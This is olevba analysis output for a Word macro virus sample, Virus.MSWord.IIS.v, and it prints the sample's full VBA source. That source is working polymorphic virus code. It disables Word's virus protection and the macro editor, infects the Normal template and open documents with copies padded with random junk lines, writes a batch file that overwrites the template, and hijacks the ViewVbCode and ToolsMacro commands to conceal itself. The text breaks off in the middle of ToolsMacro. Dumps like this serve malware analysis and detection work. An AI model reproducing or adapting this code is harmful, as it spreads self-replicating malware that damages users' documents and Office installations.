olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.IIS.v
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.IIS.v - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.IIS.v - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Û¶Ô = "‹¸©"
õ´äˆ“Ï¯Æ¨”Öœ¨ƒšÏçî§—�çí…·ÖÂ�®¢»¥Î�Ôæ›³µé _
= Chr(204)
ØÍ¿ð‡Ð´í¨²²¡¸¼¶¿¥ÀâîÙÛ¼�¨›úðÏ§ºä¡»â‡›Ô“ƒºà«ƒ”´´ï _
= _
Chr(89)
Œó‰“–Ú“ê§ÎÕ¸‚�ãäÑÙŸÁÅ´öÞÐ’´ø ùó÷Å = Chr(127)
£�‰‹†·Ëºž“§Š‹Ï²ÀùõïìÒæÃúè ÚÈ¤æ„âé¶ßëÔÞª˜Þ¦Žì = "’øøŸ§ÏË™ "
ø×ÑƒÍ×Ž¤†¨ÊÁš�Þ‹ì¥úê±ƒÞøÀñ¿ÛùÊª²¯ì _
= _
Chr(70)
÷¢£ÞÝùÅŸ®îÍÝØŠ÷Ã��ÃºÜÏ›©ÌïèÄð§Œ¯Ó“èÝ¢œÉ¨‡ñ • = Chr(75)
÷Œ¦¼“Ø½ÙÖÃ†Ï = "¡¾�’Ç¥¿ÞõåÅŸ„Šë§ŒÜ×"
ÒÆ§È”Ù®¼ _
= _
Chr(227)
Û—«Õ = "ù«Ä�È½¢éµäø"
áˆž�ä¢ôœ³  = "ž"
¬ œ’å¯—Í‰žõÌÐç¯æ¢‰à‡Ž…•õÀ¾­È‹ôÈ´�¹Þ¼“¸ÐòÏ�õš¬‹šÛ¬ _
= _
Chr(85)
ÀÆ¥šö = Chr(241)
ºß›Ùàò“ÒÉšîÝœã÷ž­òï²Âö = "ƒÉÌª¶ƒ˜†ŸÛÃ¶ñÎ­•«àÈÏ"
�”Ý _
= _
Chr(105)
°ˆ”æò = "Î¼ÑæÔðššÝ"
Ò†�Èé²È½†åÚà”Û×”¿Ìáí÷¤ùˆƒ‹ê‡«æ›™ã§ÂÊç¯Šî‘ÂÄƒÀ‹Â‡úæ = "ÐÎÁõƒ”ö"
Œé¡ïØ¬Ê£©›Àðã = "�—¢"
ÂË”Í²·Ìó�ó·½ñ¯» = Chr(113)
¬ÏÐåƒÛõÜÄ _
= Chr(76)
÷Ñ½¸èêÅÒÌ¯»²º “ñ�ãÕ”ƒËößŒ‚�´ _
= _
Chr(120)
À¸ä£ô˜ŠàÐ÷ó« = Chr(73)
¥Å˜ñ»ÙÈ¡Ùè¼®ô—‡Î = "¦ÁöÚèÞ"
ªŸ»­ƒœŒÈàê½õˆ›¾àÖ‰ª×´šî _
= _
Chr(72)
ãÑ÷èîÍñÕçž‹Å´ÕÐµúíëÞôÑžÀÖÔ’«—âòÀç¹—ùÚ«×ÑÓâÆôÔŸÖÕï = Chr(72)
åÎ¢Ü‚Ô¯ÄÆÃåÑ _
= Chr(136)
¶�ŽÉÜœãªÊö�ÈÓ¡Í = "¢"
¶·Áõ¦¯Ñ“®ÖÅì¤úµ·Óðã = "å÷ã±¼È¹êóïä¹Ñ¼“¿"
„ä¥äÜà‡ ’œ³¾ð‰áß�ãß’Ó•¢Ô„Ÿø�éŽ” = "â¯ÉÎïõÎë"
éáÌ˜³š÷Æ�ÝÙ¡ƒ³ÝÃ = "ô©¡ìç¢ªÂÏ�"
öçàÈ¡‰ªÁ ‘³Ä�‘ = "äÑ«ÔÁžö˜Ú£öè‡Õ‚"
æç±ØÄ¨ùˆÌ�¿¢�ÁÚÌÈ¸�°š»õêä®ÅÄà¥ä = "èß¹·�ÅâÔ£ß³Ñõ²Œ¨¨øÔç"
èÁÚÓÝ¡�ð�óÉç¤Ë­‡ = "ŠžŸÐˆÞÕ¥Œ–ÎÊÌµ­„"
’�Œ¨åîíÅ½ �í¶óë–ÜÛ×ª»åï—¢›®ÒÎìŠ = Chr(70)
“ç�Ð£äá˜Ó’—‰çé¶¿Ö©ú´Þîò•àÊÔà˜±ò« = "Ÿ"
á”ƒÅ’åö = "…’ÂÎØº"
ó½°¨Ïð¸”±É = Chr(218)
ÎÛ†øéöŽÞä™èƒöÖÜ†ÉæšÖÒ±ÌÈ›À¬Ú²æòù‡›Ø�Î«´¢¾¸Ö—Ÿ _
= Chr(43)
ðÒ‚®ì‹”ÞŸ‚÷Õ�š _
= _
Chr(101)
ÖÛÅ¬�ÏÚðô¿Ì˜Ì‹§Ø‹˜Á’àˆÄ…•Ï‚†ìà»»ä™®¯„˜�œ¹Ô½ = Chr(70)
£äÐæ§ÔØáÈ�ä§ÄÁúˆŒ§«¦ = "Þƒ½¹Š‚Ø»æÄò„"
Ø…¨ÈÊ¤ŒÕÀÔ‘Îªö•ê·ÕâäˆÐÌ�¦¾ö¯�¥ÎÐá§óìõñå _
= _
Chr(6)
Èøçƒ”Ç©�ì³©ö¼××ÕÓàè‹Õ•’’Ù™œÅôëàÄ� = Chr(67)
×åí—ØÏß¯œï�¯ÒÒÅ…ä÷÷ŽèÝ­°½òÂƒïµéáõÚæÄ ¿ÚéÉ» _
= Chr(154)
ÊÂñÈ›Î¡è«äÇ¯ãå›…ÄÁ¸º˜„¦ÛºÒ�žÃëÅÏßÊ = "¯‰Ö�ö¿"
ºœ = Chr(188)
 Ìñ¶¸Üƒøöà¸¥ó’’ù£Û»í�ñÙö�ËåÎ”ƒÏë = "ƒÔ"
¬‡»àÒµàù›óšˆÎéï·‘±¬ŠÌž³É‚–î§åèÆííØâŠ¶Ç„¦’‡’èì…ÊÇ� = "½ÜÃ²³ãÑ›¢"
§¡©ÇËƒÇ«ç¿ãÀ¿Ùõç¾øÄéèŠ´„Ú¨ö†Ÿ—›­žÇ½‘£³·�êóèì�² = "¢"
›ù¯ØÐ�œ…¦ôØ™ß¶¦Ø _
= Chr(76)
Ëì¸ðÄ”­ó�Ôè÷µ±å = "ë®‚íÎ‚Í"
“òÜÐºÖÓÎ‹‰…õ›‚—Ì›�£©•ì¿÷¦õ”¼¼¦ðáØà­ˆÀš¾³­ÂôÔ¦ö× = Chr(202)
‹ê¥Ø÷©žÇàÐíÇÖàŠ¤Û¾Æ—Ÿ�Ù¨ƒ§º»¥ÒÒ¾íÕ”ñô¼¡´ˆš ˜°çÏí _
= Chr(103)
¶æã�ùÉÔ�¸“™¶Ï„ŒÂÕ¡Ïµ¢Ø„º©�ÀŠ¯Á�Ÿèù“„°Á±¬ÌäÖ· = "Ê“¡�àé¡Ü¡§² Ô¥Ô–Í"
›‘šØ·µ©Ëã˜¼•¶Ûë¯Ú = Chr(98)
£¬ø“¾À› = "¯ž"
Ò»Ä¾È�‰¯Ï“Ñ¨³³Á³ëÞãŠ«‡ßõªÉÃ˜À�ÅíÞ _
= _
Chr(2)
„÷ŒåÎžâ„ã†ô£ÂÞ¬Ìó¢Û“½ØòÁØ•Æ’†ð¸’¢è‰† = "ñ’ÂêÕ‡–Ø‘¹âñóÑŒ·Ÿ"
«Ð¸»¦«è½†ùéÆ†©�•ì‡ÉÂå£îÒÁ™Ø¼�¾¡â¹ = "�ÖõÊ¢ö¿¨£�Ú"
»íí–Åä¯ÊÆï éÎ»êÌ ¿–ƒÛ°Ø�âìÈžÄø�™­‘¶Á¡— = "ÝøÊ�ÅëãŽÄ"
øÂ…¾î’ÛÐ‘¼®«´©‡­æÃµ¼½Ë³ÃÊ½Î–Çœ¶°‚È¥Ó¹¾ÔÑâ = "�ƒ"
ùè¤žØø´£ÁÏŸÒÎ£«÷Úµ¾Ÿ÷î = "èïŸ¡çØËšÛèŸÝÇò"
 ÝËÊŽÈ½Œ¹¶ ‡Ð¦ñÔÓÊÊÑÒ î = "ÌèùŽŸÝÏ´‡¯¡à"
Þ”Ôáôõä‹¤°Í„’ÄÜ­õƒ�šßÌ¼¢Æ†å = "¯óÛÎ´®¥"
ê­šÔÏâ¦ßÃÒ¯‚èÃ¤ùŠêäËÊÊ­¯ã‘ = "ÆÑÍ­ÊùÙ¾ð¢‚À‚Ê"
œ¢Åõ½„ÀÔ¨Û�¹øëš´Ð°Å£ˆ›ïÙì³ë×ŸÀôÝÁåÌ–®—ÛÞ = "Ò"
°Ç˜ôÊ¦ƒ”›ä�Ö¾¸�µ‡ùØ¶’©¾ŽÜô©ÈÂË±œ½·³¤¯¥Ÿ˜ŒÌÅ– = "×¿à§"
—¦»ÖË´Ž“¸ÑÙ±£ÕÁ„õéö£ïéÂ¯×âÎâ›ŒÛÛ÷ _
= Chr(235)
ª = "Ã…ñÕµ–"
ø‡êð�žíñ²®ç†Òî­¥�ÈŸùÁØŸßÛÇÙ³ = Chr(86)
ªºïÂ×ÓÍà‚ÊÊµäØÑáêÔ¾ÀßøÝ„ _
= Chr(244)
’œõ£ÆÔ†ÙØ›«ÊèäŒ³Ëƒ«‘ªãÎ²ËŒÃ¸‹Ì _
= _
Chr(87)
í«›Ûª�òÁ¶žŠ— = Chr(90)
í�¹éŸóÍ _
= Chr(247)
Ä¼åŒÍÅÏÃÜì§«‚¢´’®ˆÞàó�’°‹ = "æìëÄ„Ï™’"
áòù¡µ‡õê = "ð¸•­”ÅˆÕá"
Œ½šÜö = " àëëÍîæØ§Å‚÷Ã"
©¯ò¬Çú¼é¢¾ïäõ¦ã‰¹ÒÍÅ¢ = "Å»¹ö¬æËçòŽÀšð®"
¸¾à·ßÉÛÖ—è³Ÿ–ëŽÈîÒ«Ó¨ñç™¢«�ŒÑÀùŠÊ¦Â” = "ð³¦­à‰·ÄÙä¾àöåÑð¦§èê"
‹œ ‹Ò�Òß¡–¸¸�„ðÚúÊ¼Ú§é²³×¦–ðïÃ»³¡¬·ï÷²ÌÂ _
= Chr(97)
ÀòÊàïÚ‡’ = "›Ãâ�ìç“Ë¢‘•áó‚"
º›…�»�ˆãÖ–˜Šòá¾¡â‘ŒÉðÊ‹„ð»°Óçù�¯ß = Chr(206)
Ã£ú¾‚ÅõÑÖ¼—ÄË�åÖÊœ�çÇ÷ž×›…™ÊÎÞŽ˜‰•¿ìÍ·œ‘››íèÕïÎÕ = "ˆóâ¦÷"
�©¹ÐÆ³éÈŸíÜ‚ò _
= _
Chr(110)
âÒ�»©×•Ã™íàØñ”’º…²´Æ¦Æ´Üæ¹Š = Chr(56)
â¼Œ _
= Chr(78)
´’¬ºï¨Ú°Ø›®í­øÀ•µ�ÖÑÅ½¬Ä¦»ÏïÉ�°Ò¤Á½­‘Óçíœ �ÀÙë‹Ê = "öò"
Ë¬½¢ì³ÖÚºÔ³ØÕ‡µÖ¨»ùöÊŸ£… = "‚¶‡´¥ŠÏì¢ÂÒÚ†î—ê"
Ö = "Š«¦ˆöéÉ"
ó¯Ý§ÉÕ‰˜ÚØ˜ÀóøöçÊ’«®µðàð¢¯…šáÑÀÍ¢‰¹¤Ò�ß°“¥ƒÕÈ  = "£ÃŸ‰Ë¯ì©ƒ"
‚ß‘¿¨¹ñ·°—­¬ÖºÓ�ò’¡”øƒ‹¾ Â‚«§ù·‡µÆÌ¥êœ = Chr(49)
‡ƒïŽóùë¡Û�ð¶âÐ = "® ‰�Í‡÷ÉÃø²ÏÊà¶"
Application.ShowVisualBasicEditor = False
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
NoSet:
begin:
NormAt = False
VBE.CommandBars("Edit").Controls(1).Enabled = False
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros _
0
Options.VirusProtection = False
Options.ConfirmConversions = False
Application.ScreenUpdating = False
Options.SaveNormalPrompt = False
Close _
#1
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line _
Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir _
= _
Mid(a, _
8, l)
End _
If
Loop
If windir = "" Then Exit Sub
On _
Error GoTo NoInf
ms = NormalTemplate.VBProject.VBComponents.Count
For _
t2 _
= _
1 To ms
ls = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If _
ls _
> _
3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOCLOSE()" Then
NormT = 1
Exit _
For
End _
If
Next _
t2
ms = ActiveDocument.VBProject.VBComponents.Count
For _
tg _
= _
1 To ms
ls = ActiveDocument.VBProject.VBComponents(tg).CodeModule.countoflines
If _
ls _
> _
3 Then l = ActiveDocument.VBProject.VBComponents(tg).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOOPEN()" Then
Acd = 1
Exit _
For
End _
If
Next _
tg
If _
Acd _
= _
1 _
And _
NormT = 1 Then Exit Sub
If _
Acd _
= _
1 Then
FullCodeN = "Sub AutoClose()" & Chr(13)
t = 0
Randomize _
Timer
t _
= _
CInt(Rnd _
* 100)
If _
t _
< _
50 _
Then _
g = 1
If _
t _
> _
49 _
And _
t _
< _
101 _
Then _
g = 2
If _
g _
= _
1 Then
v _
= _
CInt(Rnd _
* 50)
For _
vs _
= _
1 To v
beginNn:
Z _
= _
CInt(Rnd _
* 250)
If _
Z _
= 13 Then GoTo beginNn
If _
Z _
< 65 Then GoTo beginNn
If _
Z _
< 130 Then GoTo beginNn
va _
= _
va _
& Chr(Z)
Next _
vs
v _
= _
CInt(Rnd _
* 20)
For _
vss _
= _
1 To v
begin5:
Z _
= _
CInt(Rnd _
* 250)
If _
Z _
= 13 Then GoTo begin5
If _
Z _
= 34 Then GoTo begin5
If _
Z _
< 130 Then GoTo begin5
Inn _
= _
Inn _
& Chr(Z)
Next _
vss
FullCodeN = FullCodeN & va & "=" & Chr(34) & Inn & Chr(34) & Chr(13)
End _
If
If _
g _
= _
2 Then
v _
= _
CInt(Rnd _
* 50)
For _
vsss _
= _
1 To v
begin2:
Z _
= _
CInt(Rnd _
* 250)
If _
Z _
= 13 Then GoTo begin2
If _
Z _
< 130 Then GoTo begin2
va _
= _
va _
& Chr(Z)
Next _
vsss
Z _
= _
CInt(Rnd _
* 250)
Inn = "Chr(" & Z & ")"
FullCodeN = FullCodeN & va & "=" & Inn & Chr(13)
End _
If
If _
g _
= _
3 Then
v _
= _
CInt(Rnd _
* 50)
va = "'"
For _
vssss _
= _
1 To v
begin3:
Z _
= _
CInt(Rnd _
* 250)
If _
Z _
= 13 Then GoTo begin3
If _
Z _
< 130 Then GoTo begin3
va _
= _
va _
& Chr(Z)
Next _
vssss
FullCodeN _
= _
FullCodeN & va & Chr(13)
End _
If
If _
g _
= _
4 Then
v _
= _
CInt(Rnd _
* 50)
For _
vsssss _
= _
1 To v
begin4:
Z _
= _
CInt(Rnd _
* 250)
If _
Z _
= 13 Then GoTo begin4
If _
Z _
< 130 Then GoTo begin4
va _
= _
va _
& Chr(Z)
Next _
vsssss
va = va & ":"
FullCodeN _
= _
FullCodeN & va & Chr(13)
End _
If
aaaa = ActiveDocument.VBProject.VBComponents.Item(tg).CodeModule.countoflines
hh = 1
Do
If _
hh _
= aaaa Then GoTo nextterm
hh _
= _
hh _
+ 1
a _
= ActiveDocument.VBProject.VBComponents.Item(tg).CodeModule.Lines(hh, 1)
If Right(a, 1) = ":" Then
FullCodeN _
= _
FullCodeN & a & Chr(13)
GoTo _
NextLineN
End _
If
Spac = 0
t = 0
PosL = 0
BeginN:
l = Len(a)
Do
If _
PosL _
> l Then GoTo NoCN
PosL _
= _
PosL _
+ 1
If _
Mid(a, _
PosL, 1) = Chr(34) Then
FullCodeN _
= _
FullCodeN & a & Chr(13)
GoTo _
NextLineN
End _
If
Loop
NoCN:
PosL = 0
If Right(a, 1) = "_" Then GoTo UnsplitN
GoTo _
SplitN
UnsplitN:
v = 0
Y = a
Do
If Right(Y, 1) <> "_" Then GoTo NoChN
l = Len(Y)
PosL = 0
Do
PosL _
= _
PosL _
+ 1
s _
= _
Mid(Y, _
PosL, 1)
If s = "_" Then GoTo FoundN
Loop
FoundN:
Spac _
= _
PosL _
- 1
Y _
= _
Left(Y, _
l - 1)
hh _
= _
hh _
+ 1
a _
= ActiveDocument.VBProject.VBComponents.Item(tg).CodeModule.Lines(hh, 1)
v = 1
Y _
= _
Y _
& a
Loop
NoChN:
a = Y
c = 0
PoslO = 0
PosL = 0
GoTo _
BeginN
SplitN:
PosL = 0
l = Len(a)
k = 0
If _
Spac _
<> _
0 Then
Do
k _
= _
k _
+ 1
If _
k _
> l Then GoTo NC
s _
= _
Mid(a, _
k, 1)
If s = " " Then g = k
Loop
NC:
If _
g _
<= _
Spac Then
FullCodeN _
= _
FullCodeN & a & Chr(13)
GoTo _
NextLineN
End _
If
End _
If
Do
If _
PosL _
> _
l Then
FullCodeN _
= _
FullCodeN & a & Chr(13)
GoTo _
NextLineN
End _
If
PosL _
= _
PosL _
+ 1
s _
= _
Mid(a, _
PosL, 1)
If _
s _
= _
Chr(34) Then
FullCodeN _
= _
FullCodeN & a & Chr(13)
GoTo _
NextLineN
End _
If
If s = " " Then
If _
Spac _
= _
0 Then
f = Left(a, PosL) & " " & "_"
las _
= _
Mid(a, PosL + 1, l)
FullCodeN _
= _
FullCodeN & f & Chr(13)
FullCodeN _
= _
FullCodeN & las & Chr(13)
GoTo _
NextLineN
End _
If
If _
PosL _
<= _
Spac Then
wa _
= _
PosL _
- PoslO
If _
PoslO _
<> _
0 Then
temp = Mid(a, PoslO, wa) & " " & "_"
Else
temp = Mid(a, 1, PosL) & " " & "_"
End _
If
FullCodeN _
= _
FullCodeN _
& _
temp & Chr(13)
PoslO = PosL + 1
c = 1
GoTo _
NextCharN
Else
c = 1
wa _
= _
PosL _
- (PoslO)
temp = Mid(a, PoslO, wa) & " " & "_"
Temp2 _
= _
Mid(a, PosL + 1, l)
FullCodeN _
= _
FullCodeN _
& _
temp _
& Chr(13) & Temp2 & Chr(13)
If _
PosL _
> Spac Then GoTo NextLineN
GoTo _
NextCharN
End _
If
temp = Mid(a, PoslO + 1, PosL) & " " & "_"
FullCodeN _
= _
FullCodeN & temp & Chr(13)
GoTo _
NextLineN
End _
If
NextCharN:
Loop
FullCodeN _
= _
FullCodeN & Y & Chr(13)
GoTo _
NextLineN
NextLineN:
Loop
nextterm:
End _
If
If _
NormT _
= _
1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
t = 0
Randomize _
Timer
t _
= _
CInt(Rnd _
* 100)
If _
t _
< _
50 _
Then _
g = 1
If _
t _
> _
49 _
And _
t _
< _
101 _
Then _
g = 2
If _
g _
= _
1 Then
v _
= _
CInt(Rnd _
* 50)
For _
vDs _
= _
1 To v
beginDD:
Z _
= _
CInt(Rnd _
* 250)
If _
Z _
= 13 Then GoTo beginDD
If _
Z _
< 65 Then GoTo beginDD
If _
Z _
< 130 Then GoTo beginDD
va _
= _
va _
& Chr(Z)
Next _
vDs
v _
= _
CInt(Rnd _
* 20)
For _
vDss _
= _
1 To v
beginD5:
Z _
= _
CInt(Rnd _
* 250)
If _
Z _
= 13 Then GoTo beginD5
If _
Z _
= 34 Then GoTo beginD5
If _
Z _
< 130 Then GoTo beginD5
Inn _
= _
Inn _
& Chr(Z)
Next _
vDss
FullCodeD = FullCodeD & va & "=" & Chr(34) & Inn & Chr(34) & Chr(13)
End _
If
If _
g _
= _
2 Then
v _
= _
CInt(Rnd _
* 50)
For _
vDsss _
= _
1 To v
beginD2:
Z _
= _
CInt(Rnd _
* 250)
If _
Z _
= 13 Then GoTo beginD2
If _
Z _
< 130 Then GoTo beginD2
va _
= _
va _
& Chr(Z)
Next _
vDsss
Z _
= _
CInt(Rnd _
* 250)
Inn = "Chr(" & Z & ")"
FullCodeD = FullCodeD & va & "=" & Inn & Chr(13)
End _
If
If _
g _
= _
3 Then
v _
= _
CInt(Rnd _
* 50)
va = "'"
For _
vdssss _
= _
1 To v
beginD3:
Z _
= _
CInt(Rnd _
* 250)
If _
Z _
= 13 Then GoTo beginD3
If _
Z _
< 130 Then GoTo beginD3
va _
= _
va _
& Chr(Z)
Next _
vdssss
FullCodeD _
= _
FullCodeD & va & Chr(13)
End _
If
If _
g _
= _
4 Then
v _
= _
CInt(Rnd _
* 50)
For _
vdsssss _
= _
1 To v
beginD4:
Z _
= _
CInt(Rnd _
* 250)
If _
Z _
= 13 Then GoTo beginD4
If _
Z _
< 130 Then GoTo beginD4
va _
= _
va _
& Chr(Z)
Next _
vdsssss
va = va & ":"
FullCodeD _
= _
FullCodeD & va & Chr(13)
End _
If
aaaa = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
hh = 1
Do
If _
hh _
= aaaa Then GoTo EndTerm
hh _
= _
hh _
+ 1
a _
= NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(hh, 1)
If Right(a, 1) = ":" Then
FullCodeD _
= _
FullCodeD & a & Chr(13)
GoTo _
NextLineD
End _
If
Spac = 0
t = 0
PosL = 0
beginD:
l = Len(a)
Do
If _
PosL _
> l Then GoTo NoCD
PosL _
= _
PosL _
+ 1
If _
Mid(a, _
PosL, 1) = Chr(34) Then
FullCodeD _
= _
FullCodeD & a & Chr(13)
GoTo _
NextLineD
End _
If
Loop
NoCD:
PosL = 0
If Right(a, 1) = "_" Then GoTo UnsplitD
GoTo _
SplitD
UnsplitD:
v = 0
Y = a
Do
If Right(Y, 1) <> "_" Then GoTo NoChD
l = Len(Y)
PosL = 0
Do
PosL _
= _
PosL _
+ 1
s _
= _
Mid(Y, _
PosL, 1)
If s = "_" Then GoTo FoundD
Loop
FoundD:
Spac _
= _
PosL _
- 1
Y _
= _
Left(Y, _
l - 1)
hh _
= _
hh _
+ 1
a _
= NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(hh, 1)
v = 1
Y _
= _
Y _
& a
Loop
NoChD:
a = Y
c = 0
PoslO = 0
PosL = 0
GoTo _
beginD
SplitD:
PosL = 0
l = Len(a)
k = 0
If _
Spac _
<> _
0 Then
Do
k _
= _
k _
+ 1
If _
k _
> l Then GoTo DC
s _
= _
Mid(a, _
k, 1)
If s = " " Then g = k
Loop
DC:
If _
g _
<= _
Spac Then
FullCodeD _
= _
FullCodeD & a & Chr(13)
GoTo _
NextLineD
End _
If
End _
If
Do
If _
PosL _
> _
l Then
FullCodeD _
= _
FullCodeD & a & Chr(13)
GoTo _
NextLineD
End _
If
PosL _
= _
PosL _
+ 1
s _
= _
Mid(a, _
PosL, 1)
If _
s _
= _
Chr(34) Then
FullCodeD _
= _
FullCodeD & a & Chr(13)
GoTo _
NextLineD
End _
If
If s = " " Then
If _
Spac _
= _
0 Then
f = Left(a, PosL) & " " & "_"
las _
= _
Mid(a, PosL + 1, l)
FullCodeD _
= _
FullCodeD & f & Chr(13)
FullCodeD _
= _
FullCodeD & las & Chr(13)
GoTo _
NextLineD
End _
If
If _
PosL _
<= _
Spac Then
wa _
= _
PosL _
- PoslO
If _
PoslO _
<> _
0 Then
temp = Mid(a, PoslO, wa) & " " & "_"
Else
temp = Mid(a, 1, PosL) & " " & "_"
End _
If
FullCodeD _
= _
FullCodeD _
& _
temp & Chr(13)
PoslO = PosL + 1
c = 1
GoTo _
NextCharD
Else
c = 1
wa _
= _
PosL _
- (PoslO)
temp = Mid(a, PoslO, wa) & " " & "_"
Temp2 _
= _
Mid(a, PosL + 1, l)
FullCodeD _
= _
FullCodeD _
& _
temp _
& Chr(13) & Temp2 & Chr(13)
If _
PosL _
> Spac Then GoTo NextLineD
GoTo _
NextCharD
End _
If
temp = Mid(a, PoslO + 1, PosL) & " " & "_"
FullCodeD _
= _
FullCodeD & temp & Chr(13)
GoTo _
NextLineD
End _
If
NextCharD:
Loop
FullCodeD _
= _
FullCodeD & Y & Chr(13)
GoTo _
NextLineD
NextLineD:
Loop
EndTerm:
End _
If
If _
NormT _
<> _
1 Then
look:
ms = NormalTemplate.VBProject.VBComponents.Count
For _
Inn _
= _
2 To ms
a = NormalTemplate.VBProject.VBComponents(Inn).CodeModule.countoflines
If _
a _
< _
1 Then
NormalTemplate.VBProject.VBComponents(Inn).CodeModule.AddFromstring _
(FullCodeN)
i = 20
Exit _
For
End _
If
Next _
Inn
If _
i _
<> _
20 Then
Close _
#1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close _
#1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close _
#1
NormalTemplate.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo _
look
End _
If
a = Dir(windir & "\System\lo.sys")
If a <> "" Then Kill windir & "\System\lo.sys"
NormalTemplate.OpenAsDocument
NormAtt = ActiveDocument.ReadOnly
l = ""
On _
Error GoTo eb
ActiveDocument.SaveAs FileName:=windir & "\System\lo.sys", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
NormalTemplate.Saved = True
ActiveDocument.Saved = True
ActiveDocument.Close
Close _
#1
a = Dir(windir & "\System\lo.bat")
If a <> "" Then Kill windir & "\System\lo.bat"
Close
Open windir & "\System\lo.bat" For Append As #1
Print #1, ":Begin"
l = Len(NormalTemplate.FullName)
l _
= _
l _
- 10
For _
i _
= _
1 To 500
Print #1, "rem Flitnic has catched you... he, he"
Next _
i
Print #1, ":Begin"
Print #1, "Move /y c:\Troop.dat " & NormalTemplate.FullName
Print #1, "If exist c:\Troop.dat goto Begin"
Close _
#1
NormalTemplate.Saved = True
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If _
NormAt _
= _
True Then
End _
If
notemp:
End _
If
i = 1
If _
Acd _
<> _
1 Then
Close
look2:
ms = ActiveDocument.VBProject.VBComponents.Count
For _
inn2 _
= _
2 To ms
a = ActiveDocument.VBProject.VBComponents(inn2).CodeModule.countoflines
If _
a _
< _
1 Then
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.AddFromstring _
(FullCodeD)
i = 20
Exit _
For
End _
If
Next _
inn2
If _
i _
<> _
20 Then
Close _
#1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close _
#1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close _
#1
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo _
look2
End _
If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If _
ActiveDocument.ReadOnly _
= True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved = True
End _
If
End _
If
NoInf:
eb:
a = Dir(NormalTemplate.FullName)
If a = "" Then
NormalTemplate.Saved = False
GoTo _
NoNormal
End _
If
If _
NormAtt _
= _
True Then
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
SetAttr (NormalTemplate.FullName), vbNormal
a = Shell(windir & "\System\lo.bat", 0)
Else
NormalTemplate.Save
End _
If
NormalTemplate.Saved = True
NoNormal:
End _
Sub
Sub _
ViewVbCode()
On _
Error GoTo NoDoc
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr (NormalTemplate.FullName), vbNormal
NoSet:
Close _
#1
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line _
Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir _
= _
Mid(a, _
8, l)
End _
If
Loop
Close _
#1
If windir = "" Then Exit Sub
ms = ActiveDocument.VBProject.VBComponents.Count
For _
t _
= _
1 To ms
ls = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If _
ls _
> _
3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOOPEN()" Then
Acd = 1
Exit _
For
End _
If
Next _
t
a = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
ActiveDocument.VBProject.VBComponents(t).CodeModule.deletelines 1, a
ActiveDocument.Saved = True
NoDoc:
ms = NormalTemplate.VBProject.VBComponents.Count
For _
t2 _
= _
2 To ms
ls = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If _
ls _
> _
3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOCLOSE()" Then
NormT = 1
Exit _
For
End _
If
Next _
t2
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
For _
i _
= _
1 To 2
al = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines 1, al
Next _
i
esub:
eb:
Application.ShowVisualBasicEditor = True
NoDocL:
Options.SaveNormalPrompt = False
NormalTemplate.Saved = True
End _
Sub
Sub _
ToolsMacro()
On _
Error GoTo NoDoc
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr (NormalTemplate.FullName), vbNormal
NoSet:
ms = ActiveDocument.VBProject.VBComponents.Count
For _
t _
= _
1 To ms
ls = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If _
ls _
> _
3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOOPEN()" Then
Acd = 1
Exit _
For
End _
If
Next _
t
If _
Acd _
= _
1 Then
FullCodeD = "Sub AutoOpen" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
